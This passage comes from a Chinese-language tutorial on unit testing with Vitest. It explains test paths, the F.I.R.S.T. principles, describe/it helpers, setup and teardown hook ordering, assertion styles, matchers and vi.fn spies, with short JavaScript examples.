同樣以貓被摸摸作為例子來看，假設對於貓來說能夠接受摸摸的情況只限於「頭與下巴」，而喜歡被摸的部分只有「下巴」，那麼測試案例路徑就可以這麼定義：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { // Happy Path it(\u0026#39;摸摸下巴，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) // Sad Path it(\u0026#39;摸摸頭，應該沒反應\u0026#39;, () =\u0026gt; { // ... }) // Bad Path it(\u0026#39;摸摸肚子，應該拋出錯誤\u0026#39;, () =\u0026gt; { // ... }) }) 路徑優先度 而以各個路徑優先度來說，我們應當盡可能的先完善 Happy Path 與 Sad Path 的各種案例，因為對於實際專案上來說，這些內容是我們預期元件或函式本身應提供的內容。\n然而 Bad Path 通常是建立已知哪些情況會是「不正確的使用」，我們只能就已知的狀況來預防。然而，這一部分其實再怎麼縝密，都還是會有極其例外的事情發生：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { // ... // Bad Path it(\u0026#39;摸摸肚子，應該拋出錯誤\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;摸摸尾巴，應該拋出錯誤\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;摸摸手，應該拋出錯誤\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;摸摸腳，應該拋出錯誤\u0026#39;, () =\u0026gt; { // ... }) // 舉不完 }) 因此透過測試來作防禦所有不合理的行為是不治本的行為，我應該從受測物本身提供的操作或是產品規劃上來去考量相對治本的方式；比方在「貓咪」元件上透過程式設計的部分，規劃「摸摸」行為只開放「**頭」**與「下巴」的部位，從開發階段就阻止其他開發者誤用「摸摸」方法，到最後真的有其必要特別拋出時才針對這一部分寫 Bad Path 案例。\n最後，再用一個實際一點的例子說明，假設今天有個登入的表單元件，那麼最簡單預期會有的案例就會是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 describe(\u0026#39;登入元件\u0026#39;, () =\u0026gt; { // Happy Path it(\u0026#39;輸入正確帳號密碼，應登入到ＯＯ頁面\u0026#39;, () =\u0026gt; { // ... }) // Sad Path it(\u0026#39;只輸入帳號，應該顯示請輸入密碼\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;只輸入密碼，應該顯示請輸入帳號\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;輸入錯誤帳號密碼，應該顯示登入資訊錯誤\u0026#39;, () =\u0026gt; { // ... }) }) 以上就是測試情境與測試案例最基本需要瞭解的部分，接著我們來關注於測試案例中內部應該要如何來撰寫。\n撰寫測試程式碼的前言 撰寫測試程式碼需保持的心境 談到撰寫測試，不得不提到 Robert Cecil Martin 有本經典的《無瑕的程式碼：敏捷軟體開發技巧守則》，作者在其中針對了程式碼的部分提了很多優良的建議，不論是撰寫程式碼中的命名、函式參數等等做探討，也在實際的案例中做一些討論與重構，最後回顧那些程式碼中的氣味、清理程式碼，一氣呵成。\n而其中有一個章節最主要就是在講有關「單元測試」的部分，也就是系列文前言提到「被推坑」的部分，我把裡面的概念結合我的經驗來重新闡述一次：\n若帶著單純學習的心態來看待測試程式碼，其實很容易把它當作一項輔助工具在處理，覺得沒有也沒什麼關係，甚至礙手礙腳的，甚至可能覺得還要特地花了不少心力來瞭解它，但這是一體兩面的。\n若你把它當作產品中的一部分就會發現，雖然開發時會受到測試程式碼的「限制」，但同時他其實也是在做「守護」產品程式碼這件事情；甚至因為有了「可信賴的測試」，所以當我們在進行「重構」等等調整時也才能更有信心地去處理。\n因此只要確保我們在適當的時機加入它，那麼它就能夠帶來可觀的後續效益，而既然他能夠替我們帶來效益，那我們對待測試程式碼的態度其實也應該要同理產品程式碼，可是除了讓測試程式碼如同產品程式碼一樣保持「整潔」與「可讀性」之外，我們還有什麼辦法呢？\n對於這個問題 Martin 給了一個撰寫測試碼的優良準則，那就是 F.I.R.S.T 法則。\nF.I.R.S.T 法則 F.I.R.S.T 法則顧名思義其實就是五個英文單字的縮寫，他們分別是：\nFast Independent Repeatable Self-Validating Timely Fast(快) 簡單來說就是快，因為快才能讓我們快速重複大量地檢驗產品程式碼；這意味著我們在測試程式碼中有可能會遇到要 call API 的情況，那麼我們可以將其隔離並立刻回傳我們預定好的資料來減少等待回應的時間。\nIndependent(獨立) 如我們上一篇文章所提到的，每個測試案例應該要互相獨立，彼此不受干擾之外，甚至連執行順序上都不會影響到最終結果。\nRepeatable(可重複) 可重複性主要提的就是不論在什麼設備狀況下，應該都要保持著一致的結果，這樣我們才能排除掉其他不必要的原因，專注在發生問題的程式碼上。\nSelf-Validating(能自我驗證) 測試的最終狀態應該要能夠顯示「通過與否」，而這一部分測試工具或框架都會幫我們處理好，甚至都還有提供額外的 diff 差異讓我們快速查看錯誤的地方。\nTimely(即時) 測試程式碼要盡可能的與產品程式碼同進退，如果測試程式碼落後產品程式碼太多，測試程式碼會越來越難跟上產品程式碼的步調。\n而根據對待測試程式碼心態的優良法則，在撰寫測試程式碼時就能更容易體會到他的魅力。\ndescribe \u0026amp; it 與 輔助 API describe \u0026amp; it 基礎用法 稍早有提到的測試情境與測試案例在 Vitest 工具中主要便是透過 describe 與 it(或 test) 來撰寫，而他們的用意除了規劃測試的脈絡之外，最主要是用來包裝斷言結果的資訊：\n1 2 3 4 5 6 7 8 import {describe, it} from \u0026#39;vitest\u0026#39; describe(\u0026#39;測試情境的描述\u0026#39;, () =\u0026gt; { it(\u0026#39;第一個測試案例的描述\u0026#39;, () =\u0026gt; { const add = (x, y) =\u0026gt; x + y expect(add(1, 2)).toBe(2) }) }) 假設在終端機執行上方的測試程式碼時，依據工具預設設定會在終端機顯示「錯誤的相關資訊」與「綜合結果」。\n錯誤的相關資訊：\nFAIL：發生斷言錯誤檔案路徑 + 情境描述 + 案例描述(視當下錯誤所屬的情境與案例)。 AssertionError：發生斷言錯誤的原因，與發生錯誤的段落。 Expected：預期結果。 Received：實際結果。 綜合結果：\nTest Files：總共測試了幾隻測試檔案，並顯示成功、失敗與跳過的數量。 Tests：總共測了幾個測試案例，並顯示成功、失敗與跳過的數量。 Start：測試開始時間。 Duration：測試過程總共耗費時間。 而除了上述基本用法之外，在同一個測試情境中也能容納數個測試案例。\n1 2 3 4 5 6 7 8 describe(\u0026#39;測試情境的描述\u0026#39; , () =\u0026gt; { it(\u0026#39;第一個測試案例的描述\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;第二個測試案例的描述\u0026#39;, () =\u0026gt; { // ... }) }) 甚至測試情境較為複雜的情況，測試情境(describe)也允許巢狀的方式來建構測試：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;父層情境\u0026#39;, () =\u0026gt; { describe(\u0026#39;基於父層情境的情境一\u0026#39;, () =\u0026gt; { it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { // ... }) }) describe(\u0026#39;基於父層情境的情境二\u0026#39;, () =\u0026gt; { it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;出現提示寄件者姓名與電話將直接註冊成會員\u0026#39;, () =\u0026gt; { // ... }) }) }) 相反地，若在簡單的情境的之下，只有測試案例也是允許的方式之一：\n1 2 3 4 5 6 7 8 9 it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { // ... }) describe \u0026amp; it 輔助 API 除了上述的基本用法之外，透過 describe 與 it 撰寫測試的過程中也能透過輔助的 API 來整理測試程式碼：\n.only：測試情境、測試案例皆可使用 .skip：測試情境、測試案例皆可使用 .todo：測試情境、測試案例皆可使用 .fails：測試案例才能使用 only 若在測試情境用了此指令，則在同個測試檔案中只會執行帶有 .only 的測試情境，而其餘測試情境底下所有的測試案例將會被跳過(skipped)：\n1 2 3 describe.only(\u0026#39;測試情境 1\u0026#39;, () =\u0026gt; { /* */ }) describe(\u0026#39;測試情境 2\u0026#39;, () =\u0026gt; { /* */ }) // skipped describe(\u0026#39;測試情境 3\u0026#39;, () =\u0026gt; { /* */ }) // skipped 若在測試案例中使用，則除了帶有 .only 之外的測試案例都將會被跳過：\n1 2 3 4 5 6 7 8 9 10 11 describe(\u0026#39;測試情境 1\u0026#39;, () =\u0026gt; { it.only(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) describe(\u0026#39;測試情境 2\u0026#39;, () =\u0026gt; { it.only(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) describe(\u0026#39;測試情境 3\u0026#39;, () =\u0026gt; { /* */ }) // skipped skip 測試情境或測試案例被標注時，將自動跳過該範疇內的測試案例：\n1 2 3 4 5 6 7 8 9 describe.skip(\u0026#39;測試情境 1\u0026#39;, () =\u0026gt; { it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) // skipped it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) describe(\u0026#39;測試情境 2\u0026#39;, () =\u0026gt; { it(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) it.skip(\u0026#39;測試案例\u0026#39;, () =\u0026gt; { /* */ }) // skipped }) todo 測試情境或測試案例被標注時，同樣將自動跳過該範疇內的測試案例，但 todo 含義比較接近待加入測試的區塊，並且將來若產出報告時也會特別整理出還有哪些地方需要補上測試。\nfails 最後一個介紹的是測試案例才能使用的輔助 API，還記得列測試案例時的 sad path 嗎？當測試案例應該要失敗的時候就可以透過 fails 顯性標註他們：\n1 2 3 4 it.fails(`\u0026#39;1\u0026#39; + \u0026#39;1\u0026#39; should not to be \u0026#39;11\u0026#39;`, () =\u0026gt; { const add = (x, y) =\u0026gt; Number(x) + Number(y) expect(add(\u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;)).toBe(\u0026#39;11\u0026#39;) }) 當然你也可以單純藉由斷言中的 .not 達到同樣的效果：\n1 2 3 4 it(`\u0026#39;1\u0026#39; + \u0026#39;1\u0026#39; should not to be \u0026#39;11\u0026#39;`, () =\u0026gt; { const add = (x, y) =\u0026gt; Number(x) + Number(y) expect(add(\u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;)).not.toBe(\u0026#39;11\u0026#39;) }) 以上便是測試程式碼中測試情境與測試案例的部分，有關於輔助 API 的部分有些內容不一定會使用的到，若想更加瞭解所有可用的部分可以參考 Vitest 測試情境 與 測試案例 的文件囉。\n準備(Setup)與清理(Teardown) 經過了基本的測試情境與測試案例語法，加上簡單的斷言語法 expect().toBe() 就能夠測試許多簡單的東西了，然而在測試過程中有時會遇到大量重複的「前置操作」或是每次測試後「需要清理測試中的環境」，這時我們可以透過 Vitest 提供的 Setup \u0026amp; Teardown API 來處理：\nbeforeEach：在每個測試案例執行前呼叫一次。 beforeAll：在所有測試案例執行前呼叫一次。 afterEach：在每個測試案例執行後呼叫一次。 afterAll：在所有測試案例執行後呼叫一次。 1 2 3 4 beforeEach(() =\u0026gt; { // 針對測試案例重新初始化 initTestEnv() }) Setup \u0026amp; Teardown API 的範疇 Setup \u0026amp; Teardown API 「所有」的定義是根據當下的範疇(context)來決定，除了測試檔案本身之外，使用 describe 來定義測試情境也會形成一個 context，因此假如測試情境有巢狀的情況如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 const history = [] describe(\u0026#39;父層情境\u0026#39;, () =\u0026gt; { beforeAll(() =\u0026gt; { history.push(\u0026#39;beforeAll - 父層情境\u0026#39;) }) beforeEach(() =\u0026gt; { history.push(\u0026#39;beforeEach - 父層情境\u0026#39;) }) afterAll(() =\u0026gt; { history.push(\u0026#39;afterAll - 父層情境\u0026#39;) }) afterEach(() =\u0026gt; { history.push(\u0026#39;afterEach - 父層情境\u0026#39;) }) describe(\u0026#39;子層情境 A\u0026#39;, () =\u0026gt; { beforeAll(() =\u0026gt; { history.push(\u0026#39;beforeAll - 子層情境 A\u0026#39;) }) beforeEach(() =\u0026gt; { history.push(\u0026#39;beforeEach - 子層情境 A\u0026#39;) }) afterAll(() =\u0026gt; { history.push(\u0026#39;afterAll - 子層情境 A\u0026#39;) }) afterEach(() =\u0026gt; { history.push(\u0026#39;afterEach - 子層情境 A\u0026#39;) }) it(\u0026#39;案例 1\u0026#39;, () =\u0026gt; { history.push(\u0026#39;子層情境 A 案例 1\u0026#39;) }) it(\u0026#39;案例 2\u0026#39;, () =\u0026gt; { history.push(\u0026#39;子層情境 A 案例 2\u0026#39;) }) }) describe(\u0026#39;子層情境 B\u0026#39;, () =\u0026gt; { beforeAll(() =\u0026gt; { history.push(\u0026#39;beforeAll - 子層情境 B\u0026#39;) }) beforeEach(() =\u0026gt; { history.push(\u0026#39;beforeEach - 子層情境 B\u0026#39;) }) afterAll(() =\u0026gt; { history.push(\u0026#39;afterAll - 子層情境 B\u0026#39;) }) afterEach(() =\u0026gt; { history.push(\u0026#39;afterEach - 子層情境 B\u0026#39;) }) it(\u0026#39;案例 1\u0026#39;, () =\u0026gt; { history.push(\u0026#39;子層情境 B 案例 1\u0026#39;) }) it(\u0026#39;案例 2\u0026#39;, () =\u0026gt; { history.push(\u0026#39;子層情境 B 案例 2\u0026#39;) }) }) }) 此時將透過 console.log(history) 查看並歸納整理就能得到以下結果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 --- 進入測試程式碼本身的 Context --- 進入父層情境的 Context beforeAll - 父層情境 --- 進入子層情境 A 的 Context beforeAll - 子層情境 A beforeEach - 父層情境 beforeEach - 子層情境 A 子層情境 A 案例 1 // 執行 情境 A 案例 1 的時間點 afterEach - 子層情境 A afterEach - 父層情境 beforeEach - 父層情境 beforeEach - 子層情境 A 子層情境 A 案例 2 // 執行 情境 A 案例 2 的時間點 afterEach - 子層情境 A afterEach - 父層情境 afterAll - 子層情境 A --- 離開子層情境 A 的 Context --- 進入子層情境 B 的 Context beforeAll - 子層情境 B beforeEach - 父層情境 beforeEach - 子層情境 B 子層情境 B 案例 1 // 執行 情境 B 案例 1 的時間點 afterEach - 子層情境 B afterEach - 父層情境 beforeEach - 父層情境 beforeEach - 子層情境 B 子層情境 B 案例 2 // 執行 情境 B 案例 2 的時間點 afterEach - 子層情境 B afterEach - 父層情境 afterAll - 子層情境 B --- 離開子層情境 B 的 Context afterAll - 父層情境 --- 離開父層情境的 Context --- 離開測試程式碼本身的 Context 因此我們在使用這類 API 時要注意當下 context 所包含的範圍。\n避免誤區：在 expect 後做清掃處理 除了上面的用法，有時候你可能會認為既然要清掃，那我何不在斷言後處理就好呢：\n1 2 3 4 5 6 7 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39;, () =\u0026gt; { expect().toBe() // 在這裡做清除 resetTestingEnv() }) }) 這麼做當你在測試案例都是通過的情況下都沒有問題，但是一但某個測試案例發生了錯誤，由於測試案例就會在斷言時拋出 AssertionError 後停止，因此很有可能因為一個測試案例壞了導致接下來所有測試都受到影響：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39;, () =\u0026gt; { expect().toBe() // AssertionError，這個測試案例就停在這了 resetTestingEnv() }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // 在沒有經過 `resetTestingEnv()` 下進行測試 }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // 在沒有經過 `resetTestingEnv()` 下進行測試 }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // 在沒有經過 `resetTestingEnv()` 下進行測試 }) it(\u0026#39;\u0026#39;, () =\u0026gt; { // 在沒有經過 `resetTestingEnv()` 下進行測試 }) }) 因此較佳的作法還是使用 Setup \u0026amp; Teardown API 來處理會比較好：\n1 2 3 4 5 6 7 8 9 10 11 12 13 describe(\u0026#39;\u0026#39;, () =\u0026gt; { beforeEach(\u0026#39;\u0026#39;, () =\u0026gt; { setupTestingEnv() }) afterEach(\u0026#39;\u0026#39;, () =\u0026gt; { resetTestingEnv() }) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) it(\u0026#39;\u0026#39;, () =\u0026gt; {}) }) 避免過度使用 Setup \u0026amp; Teardown API 一名對於測試領域頗有研究的 Kent C. Dodds 在 twitter 上發表：\n許多人一看了紛紛表示中槍，心想這不就是我在寫的東西嗎？因此發文一出不少人就好奇那麼到底為什麼上方的用法會比較好呢？且讓我們從抽象光譜介紹起。\n抽象光譜(The Spectrum of Abstraction) Kent C. Dodds 提出在抽象光譜中主要分成了三種概念：\nANA：Absolutely No Abstraction AHA：Avoid Hasty Abstraction DRY：Don\u0026rsquo;t Repeat Yourself 而後並將此概念應用在 Testing 身上並分別解說了三種抽象型態下的測試的優劣分析。\n其中我們往往一開始學習可能因為對語法不熟稔，因此可能會寫出 ANA Testing 形式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39; , () =\u0026gt; { // 準備 // 操作 // 斷言 }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // 準備：重複的準備類似的內容 // 操作 // 斷言 }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // 準備：重複的準備類似的內容 // 操作 // 斷言 }) }) 而隨著測試經驗越來越熟稔之後，我們可能會想盡各種方法來「節省」撰寫測試上的時間，甚至參考 DRY 心法寫出這樣的測試：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;\u0026#39;, () =\u0026gt; { // 統一的事前準備 const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // 直接操作事先準備好的內容 // 斷言 }) it(\u0026#39;\u0026#39; , () =\u0026gt; { // 直接操作事先準備好的內容 // 斷言 }) }) 而這樣的下場將會在複雜的巢狀測試情境下越來越難以閱讀與調整：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 describe(\u0026#39;\u0026#39;, () =\u0026gt; { const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) describe(\u0026#39;\u0026#39;, () =\u0026gt; { const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) // ... }) describe(\u0026#39;\u0026#39;, () =\u0026gt; { const testEnv = new TestEnv() beforeEach(() =\u0026gt; { testEnv.init() }) // ... 等等 這裡的初始準備有什麼 ？？？ }) // ... }) 而除了巢狀情境本身是個議題之外，Kent C. Dodds 認為我們應該兼容的方式去看待他，也就是說他不排斥我們去做抽象這件事情，但是首先要做的應該是先保持單純，直到我們看到足夠多共同的案例來分析能抽取出的部分，如果不夠多那甚至原先 inline 的測試案例版本也比過多抽象的版本要好得多。\n避免過度巢狀情境\n最後，共用的部分除非真的有必要透過 setup \u0026amp; teardown 實作處理，否則共用的部分大多也可以透過諸如工廠模式(factory pattern)的形式產生。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* 擷取自我某個專案內的元件測試 */ const factory = ( options = { createSpy: vi.fn, }, ) =\u0026gt; { const wrapper = mount(component, { global: { plugins: [createTestingPinia(options)], }, }) const store = useMainStore() return { wrapper, store } } 所以往後若有使用到這類 API 時不仿先思考一下我們真的需要嗎，還是有更加優雅的方式能夠解決重複的問題呢？\n斷言語法與 Matchers 斷言(Assertion)在程式設計領域中主要指的是「針對一個結果指出為真(true)或假(false)」的邏輯判斷式。\n而在測試中斷言主要指的部分如先前提到的 3A 模式中的(Assert)步驟：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;\u0026#39;, () =\u0026gt; { it(\u0026#39;\u0026#39;, () =\u0026gt; { // 準備：Arrange const wrapper = mount(component, { props: { content: \u0026#39;Hello, Unit-test!\u0026#39; } }) // 操作：Act wrapper.find(\u0026#39;[data-test=\u0026#34;button\u0026#34;]\u0026#39;).click() // 斷言：Assert expect(wrapper.find(\u0026#39;[data-test=\u0026#34;content\u0026#34;]\u0026#39;)).toBe(\u0026#39;Hello, Unit-test!\u0026#39;) }) }) 其中斷言(Assert)階段中在語法的部分則會使用到所謂的「Matchers」，以上方程式碼為例的話就會是 expect() 後方的 toBe() 這個語法，而不同的「Matchers」能比對的東西也不太一樣，瞭解什麼時候該選什麼 Matchers 基本上寫斷言的時候就能信手捻來。\n斷言語法 依據不同工具或框架所提供的斷言語法(Assertion)，對於 Matchers 來說就會有不同的寫法，所以首先我們要先來簡單認識一下不同工具之間的斷言語法風格上的差異，挑選能接受的斷言風格後再來看該風格的 Matcher 用法，而風格的部分以下將依序介紹：\nChai 斷言庫 Jest 框架中的斷言語法 Vitest 中所能用的部分 Chai Assertion Chai.js 本身是一個專注在提供斷言語法的工具庫，它提供了三種寫法：\nAssert(TDD style) 1 2 3 4 5 it(\u0026#39;Chai/Assert\u0026#39;, () =\u0026gt; { const x = \u0026#39;Orange tabby cat\u0026#39; const y = \u0026#39;fat\u0026#39; assert(x !== y, \u0026#39;Orange tabby cat is not fat\u0026#39;) }) Expect(BDD style) 1 2 3 it(\u0026#39;Chai/Expect\u0026#39;, () =\u0026gt; { expect([1, 2]).to.be.an(\u0026#39;array\u0026#39;).that.does.not.include(3) }) Should(BDD style)：透過擴充物件 prototype 給予 should 屬性的方式使我們可以直接鏈式加入 Matchers 在定義好的變數後。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 選擇一：在斷言前需要呼叫 `chai.should` 方法， import chai from \u0026#39;chai\u0026#39; chai.should() // 選擇二：直接引入下方 import \u0026#39;chai/register-should\u0026#39; // 底下的測試案例就能直接鏈式加上 Matchers it(\u0026#39;Chai/Assert\u0026#39;, () =\u0026gt; { const foo = \u0026#39;bar\u0026#39; const beverages = { tea: [\u0026#39;chai\u0026#39;, \u0026#39;matcha\u0026#39;, \u0026#39;oolong\u0026#39;] } foo.should.be.a(\u0026#39;string\u0026#39;) foo.should.equal(\u0026#39;bar\u0026#39;) foo.should.have.lengthOf(3) beverages.should.have.property(\u0026#39;tea\u0026#39;).with.lengthOf(3) }) Jest Assertion 以 Jest 測試框架中所提供的斷言方法則只有：\nExpect(BDD style)： 1 2 3 it(\u0026#39;expect/ BDD style\u0026#39;, () =\u0026gt; { expect(1).toBe(1) }) 需特別注意的是 Jest 中的 expect 與 Chai 的 expect 所提供的 Matchers 是不一樣的。\nVitest 以 Vitest 測試工具來說，斷言(Assertion)語法的部分他內建了 Chai 斷言庫與兼容了 Jest 中的斷言語法，因此主要就是在以上介紹的四種寫法中選擇一種使用！\n而接下來主要著重介紹 Jest Assertion 中的 expect 語法的 Matchers 要如何使用！\nVitest(Jest expect Matchers) 要學習這類 Matchers 除了把 API doc 翻一輪之外，最快的方式之一就是針對不同的測試結果目標類型去歸納，而依照經驗常見種類有：\n常用：toBe, not 純值比對(Primitive)類型：String, Number, Boolean\u0026hellip;, etc. 陣列比對與檢查 物件比對與檢查 監聽函式 快照 Error 由於 Matchers 繁多，所以從常用跟概念容易搞混的幾個開始先介紹起：\n常用 toBe：對資料類型為純值(Primitive Value)來說就是比對值相等 1 2 expect(1).toBe(1) // passed expect(\u0026#39;1\u0026#39;).toBe(1) // failed 對非純值(Non-Primitive Value)來說就是比記憶體位置(reference)是否相等\n1 2 3 4 5 6 7 8 9 const obj = {} const obj2 = obj expect(obj).toBe(obj2) // passed expect({}).toBe({}) // failed // `not`：用於反轉斷言的邏輯 expect(1).toBe(1) // passed expect(1).not.toBe(1) // failed expect(1).not.toBe(2) // passed 純值資料類型比對 toBeCloseTo：處理浮點數運算時 1 2 expect(0.1 + 0.2).toBe(0.3) // failed 符點溢出，結果應該會為 0.30000000000000004 expect(0.1 + 0.2).toBeCloseTo(0.3) // passed toBeGreaterThan、toBeGreaterThanOrEqual、toBeLessThan、toBeLessThanOrEqual 1 2 3 4 expect(5).toBeGreaterThan(1) // passed expect(5).toBeGreaterThanOrEqual(5) // passed expect(6).toBeLessThan(7) // passed expect(6).toBeLessThanOrEqual(6) // passed toBeDefined、toBeUndefined 1 2 3 4 var a = \u0026#39;\u0026#39; var b expect(a).toBeDefined() // passed expect(b).toBeUndefined() // passed toBeTruthy、toBeFalsy 1 2 expect(1).toBeTruthy() // passed expect(0).toBeFalsy() // passed toBeNull、toBeNaN 1 expect(null).toBeNull() // passed toMatch：字串或正則比對 1 expect(\u0026#39;0912345678\u0026#39;).toMatch(/^09[0-9]{8}$/) // passed 陣列比對與檢查 toContain：陣列是否含有目標值 1 2 expect([\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;]).toContain(\u0026#39;1\u0026#39;) // passed expect([\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;]).toContain(\u0026#39;4\u0026#39;) // failed toContainEqual： 陣列是否含有該值(類型為純值時檢驗是否相等，類型為物件時檢驗結構是否全等) 1 2 3 4 5 6 // passed expect([\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;]).toContainEqual(\u0026#39;1\u0026#39;) // passed expect([{ val: \u0026#39;1\u0026#39; }, { val: \u0026#39;2\u0026#39; }]).toContainEqual({ val: \u0026#39;1\u0026#39; }) // failed expect([{ val: \u0026#39;1\u0026#39;, something: \u0026#39;other\u0026#39; }]).toContainEqual({ val: \u0026#39;1\u0026#39; }) toHaveLength：確認其屬性的長度是否相等 1 2 3 expect(\u0026#39;12\u0026#39;).toHaveLength(2) // passed expect([1, 2]).toHaveLength(2) // passed expect({ length: 2 }).toHaveLength(2) // passed 物件比對與檢查 toEqual：比對物件結構是否相同，而非比對參照來源(reference)，而結構中若值為 undefined 會忽略 1 2 3 const A = { num: 100 } const B = { num: 100, secret: undefined } expect(A).toEqual(B) // passed toStrictEqual：與 toEqual 類似，但 undefined 不會被忽略 1 2 3 4 5 const A = { num: 100 } const B = { num: 100 } const C = { num: 100, secret: undefined } expect(A).toStrictEqual(B) // passed expect(A).toStrictEqual(C) // failed 甚至 Class 所創造的物件與物件實字(Object Literals)相比也視為不同。\n1 2 3 4 5 6 7 class MockClass { constructor(num) { this.num = num } } expect({num: 1}).toStrictEqual({num: 1}) // passed expect(new MockClass(1)).toStrictEqual({num: 1}) // failed toHaveProperty：檢查物件含有屬性與其屬性值 1 2 3 4 5 const obj = { num: 100 } expect(obj).toHaveProperty(\u0026#39;num\u0026#39;) // passed expect(obj).toHaveProperty(\u0026#39;num\u0026#39;, 100) // passed expect(obj).toHaveProperty(\u0026#39;num\u0026#39;, 200) // failed toMatchObject： 檢查物件的子層 1 2 3 4 5 6 const obj = { nested: { num: 200 }, num: 100 } expect(obj).toMatchObject({ num: 100 }) // passed expect(obj).toMatchObject({ num: 200 }) // failed expect(obj).toMatchObject({ nested: { num: 100 } }) // failed expect(obj).toMatchObject({ nested: { num: 200 } }) // passed 繼續講解下列幾個比較特別的 Matcher\n監聽函式 在測試的過程中，有時候我們不僅只是斷言受測物(SUT, System Under Test)的狀態，有時候可能會對受測目標的「依賴物」(DOC, Depended-on Component)狀態有興趣，而這時我們就無法單純以 Matchers 來斷言，因為我們需要監聽依賴物前後的變化。\n而在程式測試領域中，測試替身(test double)主要就是負責處理這一類非受測物本身所做的事情，並且在需要時還能幫我們紀錄必要的資訊。\n假若我們今天測試案例受測物本身會去呼叫到的依賴目標是個「函式」時，這時我們可以透過 Vitest 所提供的 vi.fn() 來模仿(spy)函式。\nvi.fn() 本身會回傳一個實體(CallableMockInstance)，在這個實體中會記錄著有關測試函式時會需要的資料與方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 console.log(vi.fn()) /* called: false, callCount: 0, results: [], calls: [], impl: [Function (anonymous)], reset: [Function: i], nextError: [Function (anonymous)], nextResult: [Function (anonymous)], restore: [Function: w], ... */ 因此將受測的目標函式放入 vi.fn 中，後續只要測試過程中如果測試目標去調用了已被 Spy 過的函式時，CallableMockInstance 就會幫我們紀錄相關的資訊，接著我們就可以使用斷言語法相關的 Matcher 去比對我們預期的結果，比方說：\ntoHaveBeenCalled：斷言函式有被呼叫過 1 2 3 4 5 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn(sayHi) spyOnSayHi() expect(spyOnSayHi).toHaveBeenCalled() toHaveBeenCalledTimes：斷言函式被呼叫過幾次 1 2 3 4 5 6 7 8 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn(sayHi) spyOnSayHi() spyOnSayHi() spyOnSayHi() expect(spyOnSayHi).toHaveBeenCalledTimes(3) toHaveBeenCalledWith：斷言函式被呼叫時所帶的參數 1 2 3 4 5 6 const sayHi = (something) =\u0026gt; something const spyOnSayHi = vi.fn(sayHi) spyOnSayHi(\u0026#39;Hello, Unit-Test!\u0026#39;) expect(spyOnSayHi).toHaveBeenCalledWith(\u0026#39;Hello, Unit-Test!\u0026#39;) toHaveReturned：斷言函式呼叫後應該至少要返回值一次 1 2 3 4 5 6 const sayHi = (something) =\u0026gt; something + \u0026#39; Hello, Spy!\u0026#39; const spyOnSayHi = vi.fn((val) =\u0026gt; sayHi(val)) spyOnSayHi(\u0026#39;Hello, Unit-Test!\u0026#39;) expect(spyOnSayHi).toHaveReturned() 